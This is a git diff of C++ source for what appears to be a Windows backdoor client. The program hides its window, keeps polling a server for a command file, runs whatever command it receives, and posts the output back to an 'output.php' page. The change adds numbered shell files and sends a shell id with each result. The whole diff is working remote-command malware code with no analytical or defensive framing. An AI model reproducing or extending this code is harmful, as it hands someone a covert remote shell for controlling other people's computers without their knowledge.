@@ -25,6 +25,10 @@ bool sendHttpRequests(const string& address, const string& page, string& respons
 void hideWindow();
 string URLEncode(const string& value);
 
+    string server = "localhost";
+    string shellNo = "0";
+    string shellFilePath = "/shell"+shellNo+".txt";
+    string outputPagePath = "/output.php";
 
 int main(){
 
@@ -35,18 +39,17 @@ int main(){
     hideWindow();
     while (true){
 
-        command = getCommand("localhost", "/shell.txt");
-
+        command = getCommand(server, shellFilePath);
         
         if(command != ""){
             
             result = ExecuteCommand(command);
             if(result==""){
 
-                sendOutput("localhost", "/output.php", "output non letto");
+                sendOutput(server, outputPagePath, "output non letto");
             }
             else{
-                sendOutput("localhost", "/output.php", result);
+                sendOutput(server, outputPagePath, result);
             }
 
         }
@@ -113,7 +116,7 @@ void sendOutput(const string& address, const string& page, const string& output)
 
     string response;
     
-    sendHttpRequests(address, page, response, true, "output="+URLEncode(output));
+    sendHttpRequests(address, page, response, true, "output="+URLEncode(output)+"&shellNo="+shellNo);
 
 
 }
@@ -175,10 +178,6 @@ bool sendHttpRequests(const string& address, const string& page, string& respons
         InternetCloseHandle(open);
         return false;
     }
-
-
-    
-
     
     
 
